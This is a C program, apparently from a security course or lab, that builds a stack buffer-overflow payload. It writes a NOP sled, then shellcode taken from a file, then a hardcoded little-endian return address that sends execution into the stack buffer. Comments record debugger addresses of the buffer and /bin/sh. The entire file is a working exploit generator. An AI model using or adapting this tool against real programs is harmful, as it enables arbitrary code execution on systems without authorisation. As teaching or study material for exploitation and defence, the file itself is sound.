// Includes
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Function to convert bigEndian to littleEndian
unsigned char* littleEndian(char *str, int numChars);

// 0x7fffffffdc30 address of buf (according to gdb)
// 0x7ffff7b99673 address of /bin/sh/
// 0x7fffffffdca0 <- start of buf according to a.out

// Defines
#define ADDR_SIZE 8
#define BITS_IN_BYTE 8
#define NOP 0x90
#define BUF_ADDR "0x7fffffffdca0"

int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  FILE *instFp;
  int fileSize;
  int i;
  char input;
  char cNop = NOP;
  int numChars;
  unsigned char *instFile;
  unsigned char *addr;

  // Store the address of the Buffer start.
  addr = littleEndian( BUF_ADDR, 8 );

  // Notify user with instructions on how to use the program
  if(argc != 3){
    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer]\n");
    printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    exit(1);
  }

  // pull argument variables
  instFile = argv[1];
  numChars = atoi(argv[2]) + 8; //add 8 bytes to skip over Frame Pointer

  // open instructions for reading in binary
  instFp = fopen(instFile, "rb");

  // Check to ensure output file is created properly
  if(file == NULL){
    printf("Error opening file. Exiting.");
    exit(1);
  }

  // Check to ensure instruction file was opened correctly
  if (instFp == NULL){
    printf("Error opening instruction file. Exiting.");
    exit(1);
  }

  //find out how many characters are in instruction file
  fseek(instFp, 0L, SEEK_END);
  fileSize = ftell(instFp);
  rewind(instFp);
  
  //exit if we can't fit instructions in buffer
  if(fileSize > numChars){
    printf("Instruction set size cannot exceed number of characters in buffer.");
    exit(1);
  }

  // Fill up file with our NOP-Sled
  for(i = fileSize; i < numChars; i++)
    fwrite(&cNop, 1, 1, file);

  // Copy instructions to file.
  int j = 0;
  while(j < fileSize){
    input = fgetc(instFp);
    putc(input, file);
    j++;
  }

  // rewrite return address to start of buffer to execute from the stack/
  fwrite(addr, sizeof(char), ADDR_SIZE, file);
  
  free(addr);

  fclose(file);
  fclose(instFp);
}

/*
  littleEndian takes a character address and a specified required number of bytes,
  it returns the address (assumed to be in the form 0x000000) in little endian format,
  padded with zeroes. 
 */
unsigned char* littleEndian(char *addr, int numBytes){
  //stop people from attempting to write address that is longer than possible
  if(numBytes > ADDR_SIZE){
    return NULL;
  }

  // Local variables
  unsigned char *ret = malloc(ADDR_SIZE);
  char tmp;
  int i = 0, j;

  //convert address to a hex number
  long long hex = strtoll(addr, NULL, 16);

  //pad for size 
  for(i = 0; i < ADDR_SIZE - numBytes; i++){
    ret[i] = 0;
  }

  i = ADDR_SIZE - 1;

  //place hex into char array digit by digit
  while(hex != 0){ 
    ret[i] = hex & 0xFF;
    hex = hex >> BITS_IN_BYTE;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE - 1;
  for(i = 0; i < ADDR_SIZE / 2; i++){
    tmp = ret[i];

    ret[i] = ret[j];
    ret[j] = tmp;

    j--;
  }
  
  return ret;
}
